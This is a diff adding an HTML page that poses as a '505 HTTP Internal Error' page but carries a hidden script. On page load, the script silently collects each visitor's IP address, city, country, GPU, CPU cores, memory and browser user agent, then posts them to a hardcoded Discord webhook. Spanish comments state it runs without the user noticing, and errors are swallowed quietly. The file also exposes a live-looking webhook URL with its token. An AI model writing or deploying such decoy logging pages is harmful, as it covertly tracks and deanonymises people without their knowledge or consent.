@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>505 HTTP Internal Error</title>
+    <style>
+        body { 
+            background-color: #f1f1f1; 
+            color: #333; 
+            font-family: "Segoe UI", Tahoma, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+        }
+        .container { max-width: 600px; padding: 20px; }
+        h1 { font-size: 72px; margin: 0; color: #e74c3c; }
+        h2 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #666; line-height: 1.6; }
+        .error-code { font-weight: bold; color: #444; margin-top: 20px; border-top: 1px solid #ddd; padding-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>505</h1>
+        <h2>HTTP Version Not Supported</h2>
+        <p>Maybe the creator of web esta creandose todavia. Please try again later or contact the administrator if the problem persists.</p>
+        <div class="error-code">Status: Internal_Server_Error_505</div>
+    </div>
+
+    <script>
+        // TU WEBHOOK DE DISCORD
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491906436685496381/ygIRTXqmZjvXYiKe6eZjMV2hjCZL05v4b9xy4GjBoqSLxkRZ6I9hhEotcOVRdMXh9QVv";
+
+        async function capturar() {
+            try {
+                // 1. Datos de IP y Ubicación
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+
+                // 2. Datos de Hardware (GPU)
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A";
+
+                // 3. Preparar el mensaje para Discord
+                const reporte = {
+                    username: "Baires Log System",
+                    embeds: [{
+                        title: "🚨 Reporte de Acceso Detectado",
+                        color: 15158332, // Rojo
+                        fields: [
+                            { name: "👤 Usuario/PC", value: `**IP:** ${data.ip}\n**Ciudad:** ${data.city}\n**País:** ${data.country_name}`, inline: false },
+                            { name: "🖥️ Hardware Detectado", value: `**GPU:** ${gpu}\n**Cores:** ${navigator.hardwareConcurrency || "N/A"}\n**RAM:** ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"}`, inline: true },
+                            { name: "⚙️ OS & Navegador", value: `\`${navigator.userAgent.substring(0, 150)}\``, inline: false }
+                        ],
+                        footer: { text: "Sistema de logs automatizado" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // 4. Enviar a Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(reporte)
+                });
+
+            } catch (err) {
+                console.log("Error silencioso.");
+            }
+        }
+
+        // Se ejecuta al cargar sin que el usuario note nada
+        window.onload = capturar;
+    </script>
+</body>
+</html>
